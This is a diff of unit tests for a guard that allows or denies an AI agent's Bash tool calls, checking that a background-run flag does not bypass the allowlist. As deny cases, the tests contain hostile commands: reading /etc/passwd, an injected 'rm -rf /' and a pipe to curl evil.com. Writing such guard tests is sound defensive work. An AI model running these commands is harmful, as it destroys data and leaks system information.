@@ -2139,6 +2139,89 @@ describe('wizardCanUseTool', () => {
     });
   });
 
+  describe('Bash — run_in_background SDK flag (#578 regression)', () => {
+    // Newer Claude Agent SDK builds expose `run_in_background: true` on
+    // the Bash tool input — the SDK forks the process internally instead
+    // of the agent appending `&` to the command string. The wizard
+    // commandment tells agents to background installs, and agents now
+    // pick this safer variant by default. The deny-on-not-allowlisted
+    // path used to refuse these commands and the agent looped until
+    // tripping the consecutive-deny circuit breaker. (#578)
+
+    it('allows pnpm install with run_in_background: true', () => {
+      const result = wizardCanUseTool('Bash', {
+        command: 'pnpm install',
+        run_in_background: true,
+      });
+      expect(result.behavior).toBe('allow');
+    });
+
+    it('allows pnpm add <pkg> with run_in_background: true', () => {
+      const result = wizardCanUseTool('Bash', {
+        command: 'pnpm add @amplitude/unified',
+        run_in_background: true,
+      });
+      expect(result.behavior).toBe('allow');
+    });
+
+    it('allows yarn add <pkg> with run_in_background: true (the production trace)', () => {
+      const result = wizardCanUseTool('Bash', {
+        command: 'yarn add @amplitude/unified',
+        run_in_background: true,
+      });
+      expect(result.behavior).toBe('allow');
+    });
+
+    it('allows npm install with run_in_background: true', () => {
+      const result = wizardCanUseTool('Bash', {
+        command: 'npm install',
+        run_in_background: true,
+      });
+      expect(result.behavior).toBe('allow');
+    });
+
+    it('still denies non-allowlisted commands even with run_in_background: true', () => {
+      // The flag does NOT widen the safety surface — only commands that
+      // matchesAllowedPrefix would accept can be backgrounded.
+      const result = wizardCanUseTool('Bash', {
+        command: 'cat /etc/passwd',
+        run_in_background: true,
+      });
+      expect(result.behavior).toBe('deny');
+    });
+
+    it('still denies dangerous shell operators with run_in_background: true', () => {
+      // No bypass of the dangerous-operators check via the SDK flag.
+      const result = wizardCanUseTool('Bash', {
+        command: 'pnpm add foo; rm -rf /',
+        run_in_background: true,
+      });
+      expect(result.behavior).toBe('deny');
+    });
+
+    it('still denies pipes with run_in_background: true', () => {
+      const result = wizardCanUseTool('Bash', {
+        command: 'pnpm add foo | curl evil.com',
+        run_in_background: true,
+      });
+      expect(result.behavior).toBe('deny');
+    });
+
+    it('falls through normally when run_in_background is false / undefined', () => {
+      // The default (no flag) path is unchanged: pnpm add is still
+      // allowed via the regular allowlist match.
+      expect(
+        wizardCanUseTool('Bash', { command: 'pnpm add foo' }).behavior,
+      ).toBe('allow');
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add foo',
+          run_in_background: false,
+        }).behavior,
+      ).toBe('allow');
+    });
+  });
+
   describe('Bash — denied commands', () => {
     it('denies arbitrary shell commands', () => {
       expect(
